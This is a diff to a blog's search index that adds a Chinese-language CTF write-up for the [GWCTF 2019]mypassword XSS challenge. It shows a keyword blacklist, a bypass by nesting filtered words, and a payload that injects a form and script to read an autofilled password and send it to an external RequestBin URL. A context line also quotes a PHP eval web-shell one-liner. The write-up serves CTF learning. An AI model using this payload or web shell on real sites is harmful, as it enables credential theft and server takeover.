@@ -987,4 +987,21 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 <p>打印环境变量直接出</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2023/01/06/XSS/</url>
+    <content><![CDATA[<h1 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h1><p>打开题目发现代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (document.cookie &amp;&amp; document.cookie != &#x27;&#x27;) &#123;</span><br><span class="line">	var cookies = document.cookie.split(&#x27;; &#x27;);</span><br><span class="line">	var cookie = &#123;&#125;;</span><br><span class="line">	for (var i = 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		var arr = cookies[i].split(&#x27;=&#x27;);</span><br><span class="line">		var key = arr[0];</span><br><span class="line">		cookie[key] = arr[1];</span><br><span class="line">	&#125;</span><br><span class="line">	if(typeof(cookie[&#x27;user&#x27;]) != &quot;undefined&quot; &amp;&amp; typeof(cookie[&#x27;psw&#x27;]) != &quot;undefined&quot;)&#123;</span><br><span class="line">		document.getElementsByName(&quot;username&quot;)[0].value = cookie[&#x27;user&#x27;];</span><br><span class="line">		document.getElementsByName(&quot;password&quot;)[0].value = cookie[&#x27;psw&#x27;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当typeof(cookie[‘user’])，typeof(cookie[‘psw’])都不是未定义时会把内容保存到表单</p>
+<p>先注册登录</p>
+<p>feedback里有过滤，说明很可能在这里面注入</p>
+<p>把一些关键字词替换为空</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(is_array($feedback))&#123;</span><br><span class="line">				echo &quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">				return false;</span><br><span class="line">			&#125;</span><br><span class="line">			$blacklist = [&#x27;_&#x27;,&#x27;\&#x27;&#x27;,&#x27;&amp;&#x27;,&#x27;\\&#x27;,&#x27;#&#x27;,&#x27;%&#x27;,&#x27;input&#x27;,&#x27;script&#x27;,&#x27;iframe&#x27;,&#x27;host&#x27;,&#x27;onload&#x27;,&#x27;onerror&#x27;,&#x27;srcdoc&#x27;,&#x27;location&#x27;,&#x27;svg&#x27;,&#x27;form&#x27;,&#x27;img&#x27;,&#x27;src&#x27;,&#x27;getElement&#x27;,&#x27;document&#x27;,&#x27;cookie&#x27;];</span><br><span class="line">			foreach ($blacklist as $val) &#123;</span><br><span class="line">		        while(true)&#123;</span><br><span class="line">		            if(stripos($feedback,$val) !== false)&#123;</span><br><span class="line">		                $feedback = str_ireplace($val,&quot;&quot;,$feedback);</span><br><span class="line">		            &#125;else&#123;</span><br><span class="line">		                break;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以把过滤的插在中间,例如是incookieput的话，替换后会剩下input。由于login.js中有记录密码的功能，所以我们可以构造一个表单在feedback页面提交，在 <a href="http://http.requestbin.buuoj.cn/">http://http.requestbin.buuoj.cn</a> （RequestBin提供了一个URL，该URL将收集对其发出的请求，首页点击create a requestbin）页面接收flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;</span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;</span><br><span class="line">docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/x18xpyx1/?a=&quot;+psw;</span><br><span class="line">&lt;/scrcookieipt&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
 </search>
